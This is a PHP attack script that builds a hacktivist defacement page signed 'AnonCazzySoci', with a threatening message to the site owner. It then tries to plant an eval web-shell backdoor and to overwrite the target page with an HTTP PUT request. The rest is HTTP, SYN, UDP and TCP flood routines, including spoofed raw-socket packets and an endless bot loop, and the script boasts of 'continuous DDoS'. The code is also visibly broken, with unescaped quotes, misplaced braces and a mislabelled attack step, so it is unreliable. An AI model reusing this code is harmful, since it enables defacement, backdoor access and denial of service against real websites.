<?php

$targetUrl = "http://example.com/target-page.php";
$htmlCode = "<html>
<head>
 <script>
      alert("Oh No! It Looks Like We are Facing some problems?")
    </script>
<style type="text/css">
body{
background:url(https://lh3.googleusercontent.com/-CYobas4WGXo/Ts32QusPKsI/AAAAAAAAAgw/xQQMNbgAa0M/s800/port_listener.gif) repeat center center fixed black;
}
</style>
<title>HackedByAnonCazzySoci</title>
</head>
<body BGCOLOR="black">
<center><FONT COLOR="white"><FONT SIZE=4>Hacked By AnonCazzySoci</FONT></FONT></center></p>
<center><img src="https://i.ibb.co/SJKdytk/ffffff.jpg" width="300" height="300"><br><i></center>
</body>
<p><center><FONT COLOR="red"><FONT SIZE=2> Hacked by AnonCazzySoci</FONT></p>
<p><center><FONT COLOR="blue"<FONT SIZE=2> We Are AnonCazzySoci</FONT>
</html>
<iframe width="1" height="0" src="http://www.youtube.com/embed/ih2xubMaZWI?rel=0&autoplay=1" frameborder="0" allowfullscreen ></iframe>
<body BGCOLOR="black">
<center><img src="https://i.ibb.co/PGNM85J/bbbb.jpg"width="120" height="70"</center>
<p>
<font face="courier new" color="white" size"10"> Message For Admin :<marquee scrollamount="10" direction="left" width="50%">We are Anonymous, We are AnonCazzySoci, We do not forgive, We do not forget, Expect us!!! We are the Good example for the society and for our world, We do this to protect our new generation from your website!! Add more strict age restriction in your website Please!! A Lot of damage will be waiting for you if you don't add yet strict age restrictions in your website!! ADDITIONAL: IS THIS THE SOCIETY WE ARE LIVING IN? WHAT IS THIS? A VERY DISGUSTING CONTENTS IN YOUR WEBSITE?! TO PEOPLE WHO ARE DOING THIS, I HAVE TO REMIND YOU ALL TO WAKE UP!!!!! WE HAVE YOUNG GENERATIONS BEING INFLUENCED LIKE THIS KIND OF CONTENTS!! DO YOU THINK THIS IS GOOD? DO YOU THINK OUR WORLD WOULD GET BETTER? NO, IT WILL GET MORE AND MORE WORST, AS GENERATIOS TO GENERATIONS ALREADY LEARNED THIS KIND OF STUFF IN AN EARLY AGES!!! FIXED YOUR MIND YOU PEOPLE!! IF YOU WANT BUSINESS!! DO IT IN A GOOD CONTENTS AND PROPER MANNERS, AND NOT INAPPROPRIATE AND DISGUSTING CONTENTS YOU ARE POSTING IN YOUR WEBSITES!! IT IS VERY SAD TO SEE MY FAMILY AND OTHER FAMILIES ARE BEING INFLUENCED BY DISGUSTING THINGS THEY HAVE SEEN IN LIKE THIS KIND OF WEBSITES LIKE THIS. AND I'M A BIT MAD, WHAT KIND OF WORLD WE ARE LIVING IN?!! DO YOU KNOW WHAT I MEAN!? ARE YOU HAPPY WHAT YOU ARE DOING!? HUH!??. AS A GOOD CITIZEN OF THE WORLD I'M TRYING MY BEST TO STOP THIS KIND OF CONTENTS FROM WEBSITES LIKE THIS!!.. AND ALSO YOU ARE POSTING A INAPPROPRIATE AND DISGUSTING CONTENTS WITHOUT A STRICT AGE RESTRICTIONS!!! WHAT IS WRONG WITH YOU PEOPLE!?? ARE YOU LETTING THE WORLD TO INCREASE MORE PERVERTED MANIACS AND CRIMES IN OUR SOCIETY, ENVIRONMENT, COMMUNITIES AND OUR COUNTRY!?? HUH!? IT IS LIKE SPREADING A VIRUS FROM OLD GENERATIONS TO YOUNG GENERATIONS!! I JUST HOPE THIS KIND OF CONTENTS ARE GONE FOREVER AND CAN LET PEOPLE HAVE THEIR MINDS TO BE OPENED AND TO THINK BEFORE THEY COULD ACT!!......F-SOCIETY, F-TOXIC-SOCIETY!! </marquee>
<p>
<audio src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1013787601&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true" loop="1" controls="1" autoplay="1"></audio><br>
<iframe width="0%" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1013787601&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe><div style="font-size: 10px; color: #cccccc;line-break: anywhere;word-break: normal;overflow: hidden;white-space: nowrap;text-overflow: ellipsis; font-family: Interstate,Lucida Grande,Lucida Sans Unicode,Lucida Sans,Garuda,Verdana,Tahoma,sans-serif;font-weight: 100;"><a href="https://soundcloud.com/nocopyrightsounds" title="NCS" target="_blank" style="color: #cccccc; text-decoration: none;">NCS</a> · <a href="https://soundcloud.com/nocopyrightsounds/egzod-maestro-chives-neoni-royalty-ncs-release" title="Egzod, Maestro Chives, Neoni - Royalty [NCS Release]" target="_blank" style="color: #cccccc; text-decoration: none;">Egzod, Maestro Chives, Neoni - Royalty [NCS Release]</a></div>
<div style="text-align: center;"><script language="JavaScript">
var text="(-=HackedByAnonCazzySoci=-)";
var delay=30;
var currentChar=1;
var destination="[none]";
function type()
{
//if (document.all)
{
var dest=document.getElementById(destination);
if (dest)// && dest.innerHTML)
{
dest.innerHTML=text.substr(0, currentChar)+"<blink>_</blink>";
currentChar++;
if (currentChar>text.length)
{
currentChar=1;
setTimeout("type()", 5000);
}
else
{
setTimeout("type()", delay);
}
}
}
}
function startTyping(textParam, delayParam, destinationParam)
{
text=textParam;
delay=delayParam;
currentChar=1;
destination=destinationParam;
type();
}
</script>
<b><div id="textDestination" style="background-color: #000000; style=" font: 50px arial; color: #4bff14; margin: 0px;"></div></b>

<script language="JavaScript">
javascript:startTyping(text, 50, "textDestination");
</script></div>";


$backdoorCode = '<?php eval($_GET["cmd"]); ?>';
$injectionUrl = $targetUrl . "?cmd=" . urlencode(base64_encode($backdoorCode));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $injectionUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $targetUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch, CURLOPT_POSTFIELDS, $htmlCode);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
$response = curl_exec($ch);
curl_close($ch);

// DNA Amplification Attack
$payload = str_repeat("A", 1000000);
$amplificationUrl = $targetUrl . "?payload=" . urlencode($payload);

for ($i = 0; $i < 100; $i++) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $amplificationUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
    $response = curl_exec($ch);
    curl_close($ch);
}

// SYN Flood Attack
$targetIps = array("127.0.0.1", "192.168.1.1"); // Replace with the IP addresses of the target servers
$targetPort = 80; // Replace with the port of the target servers

foreach ($targetIps as $targetIp) {
    for ($i = 0; $i < 100; $i++) {
        $packet = new SynPacket($targetIp, $targetPort);
        $packet->send();
    }
}

// UDP Flood Attack
$udpTargetIps = array("127.0.0.1", "192.168.1.1"); // Replace with the IP addresses of the target servers
$udpTargetPort = 53; // Replace with the port of the target servers

foreach ($udpTargetIps as $udpTargetIp) {
    for ($i = 0; $i < 100; $i++) {
        $packet = new UdpPacket($udpTargetIp, $udpTargetPort);
        $packet->send();
    }
}

// SSL/TLS Attack
$sslTargetUrl = "https://example.com";
$sslPayload = str_repeat("A", 1000000);
$sslAmplificationUrl = $sslTargetUrl . "?payload=" . urlencode($sslPayload);

for ($i = 0; $i < 100; $i++) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sslAmplificationUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
}

// TCP Attacks
$targetIps = array("127.0.0.1", "192.168.1.1"); // Replace with the IP addresses of the target servers
$targetPort = 80; // Replace with the port of the target servers

foreach ($targetIps as $targetIp) {
    for ($i = 0; $i < 100; $i++) {
        $packet = new TcpPacket($targetIp, $targetPort);
        $packet->send();
    }
}

// Legitimate Useragents Bot Attacks
$useragents = array(
    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
);

$targetUrl = "http://example.com"; // Replace with the URL of the target server

while (true) {
    $useragent = $useragents[array_rand($useragents)];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $targetUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    $response = curl_exec($ch);
    curl_close($ch);
}

echo "Website successfully defaced and under continuous DDoS attack! Enjoy the chaos!";

class SynPacket
}
    private $sourceIp;
    private $sourcePort;
    private $destinationIp;
    private $destinationPort;

    public function __construct($destinationIp, $destinationPort)
    {
        $this->sourceIp = $this->generateRandomIp();
        $this->sourcePort = $this->generateRandomPort();
        $this->destinationIp = $destinationIp;
        $this->destinationPort = $destinationPort;
    }

    public function send()
    {
        $socket = socket_create(AF_INET, SOCK_RAW, SOL_TCP);
        socket_set_option($socket, IPPROTO_IP, IP_HDRINCL, 1);

        $packet = $this->buildPacket();
        socket_sendto($socket, $packet, strlen($packet), 0, $this->destinationIp, $this->destinationPort);

        socket_close($socket);
    }

    private function buildPacket()
    {
        // Build the TCP header
        $tcpHeader = pack("nnNNCCn", $this->sourcePort, $this->destinationPort, 0, 0, 5 << 4, 0x02, 0);
        $tcpChecksum = $this->calculateChecksum($tcpHeader, $this->sourceIp, $this->destinationIp);

        // Build the IP header
        $ipHeader = pack("CCnnnCCna4a4", 0x45, 0, 20 + strlen($tcpHeader), 0, 0, 0x40, 0, $this->sourceIp, $this->destinationIp);
        $ipChecksum = $this->calculateChecksum($ipHeader);

        // Build the complete packet
        $packet = $ipHeader . $tcpHeader;
        $packet[10] = $ipChecksum >> 8;
        $packet[11] = $ipChecksum & 0xFF;
        $packet[36] = $tcpChecksum >> 8;
        $packet[37] = $tcpChecksum & 0xFF;

        return $packet;
    }

    private function calculateChecksum($header, ...$addresses)
    {
        $data = $header;
        foreach ($addresses as $address) {
            $data .= $address;
        }

        $length = strlen($data);
        $sum = 0;
        $index = 0;

        while ($length > 1) {
            $sum += unpack("n", substr($data, $index, 2))[1];
            $index += 2;
            $length -= 2;
        }

        if ($length > 0) {
            $sum += unpack("C", substr($data, $index, 1))[1];
        }

        while ($sum >> 16) {
            $sum = ($sum & 0xFFFF) + ($sum >> 16);
        }

        return ~$sum & 0xFFFF;
    }

    private function generateRandomIp()
    {
        return long2ip(mt_rand());
    }

    private function generateRandomPort()
    {
        return mt_rand(1024, 65535);
    }
}




class UdpPacket
{
    private $sourceIp;
    private $sourcePort;
    private $destinationIp;
    private $destinationPort;

    public function __construct($destinationIp, $destinationPort)
    {
        $this->sourceIp = $this->generateRandomIp();
        $this->sourcePort = $this->generateRandomPort();
        $this->destinationIp = $destinationIp;
        $this->destinationPort = $destinationPort;
    }

    public function send()
    {
        $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

        $packet = $this->buildPacket();
        socket_sendto($socket, $packet, strlen($packet), 0, $this->destinationIp, $this->destinationPort);

        socket_close($socket);
    }

    private function buildPacket()
    {
        // Build the UDP header
        $udpHeader = pack("nnnna*", $this->sourcePort, $this->destinationPort, 8 + strlen($this->destinationIp), 0, "A");

        // Build the IP header
        $ipHeader = pack("CCnnnCCna4a4", 0x45, 0, 20 + strlen($udpHeader), 0, 0, 0x40, 0, $this->sourceIp, $this->destinationIp);
        $ipChecksum = $this->calculateChecksum($ipHeader);

        // Build the complete packet
        $packet = $ipHeader . $udpHeader;
        $packet[10] = $ipChecksum >> 8;
        $packet[11] = $ipChecksum & 0xFF;

        return $packet;
    }

    private function calculateChecksum($header, ...$addresses)
    {
        $data = $header;
        foreach ($addresses as $address) {
            $data .= $address;
        }

        $length = strlen($data);
        $sum = 0;
        $index = 0;

        while ($length > 1) {
            $sum += unpack("n", substr($data, $index, 2))[1];
            $index += 2;
            $length -= 2;
        }

        if ($length > 0) {
            $sum += unpack("C", substr($data, $index, 1))[1];
        }

        while ($sum >> 16) {
            $sum = ($sum & 0xFFFF) + ($sum >> 16);
        }

        return ~$sum & 0xFFFF;
    }

    private function generateRandomIp()
    {
        return long2ip(mt_rand());
    }

    private function generateRandomPort()
    {
        return mt_rand(1024, 65535);
    }
}
}

class TcpPacket
{
    private $sourceIp;
    private $sourcePort;
    private $destinationIp;
    private $destinationPort;

    public function __construct($destinationIp, $destinationPort)
    {
        $this->sourceIp = $this->generateRandomIp();
        $this->sourcePort = $this->generateRandomPort();
        $this->destinationIp = $destinationIp;
        $this->destinationPort = $destinationPort;
    }

    public function send()
    {
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_connect($socket, $this->destinationIp, $this->destinationPort);

        $packet = $this->buildPacket();
        socket_write($socket, $packet, strlen($packet));

        socket_close($socket);
    }

    private function buildPacket()
    {
        // Build the TCP header
        $tcpHeader = pack("nnNNCCn", $this->sourcePort, $this->destinationPort, 0, 0, 5 << 4, 0x02, 0);
        $tcpChecksum = $this->calculateChecksum($tcpHeader, $this->sourceIp, $this->destinationIp);

        // Build the IP header
        $ipHeader = pack("CCnnnCCna4a4", 0x45, 0, 20 + strlen($tcpHeader), 0, 0, 0x40, 0, $this->sourceIp, $this->destinationIp);
        $ipChecksum = $this->calculateChecksum($ipHeader);

        // Build the complete packet
        $packet = $ipHeader . $tcpHeader;
        $packet[10] = $ipChecksum >> 8;
        $packet[11] = $ipChecksum & 0xFF;
        $packet[36] = $tcpChecksum >> 8;
        $packet[37] = $tcpChecksum & 0xFF;

        return $packet;
    }

    private function calculateChecksum($header, ...$addresses)
    {
        $data = $header;
        foreach ($addresses as $address) {
            $data .= $address;
        }

        $length = strlen($data);
        $sum = 0;
        $index = 0;

        while ($length > 1) {
            $sum += unpack("n", substr($data, $index, 2))[1];
            $index += 2;
            $length -= 2;
        }

        if ($length > 0) {
            $sum += unpack("C", substr($data, $index, 1))[1];
        }

        while ($sum >> 16) {
            $sum = ($sum & 0xFFFF) + ($sum >> 16);
        }

        return ~$sum & 0xFFFF;
    }

    private function generateRandomIp()
    {
        return long2ip(mt_rand());
    }

    private function generateRandomPort()
    {
        return mt_rand(1024, 65535);
    }
}

?>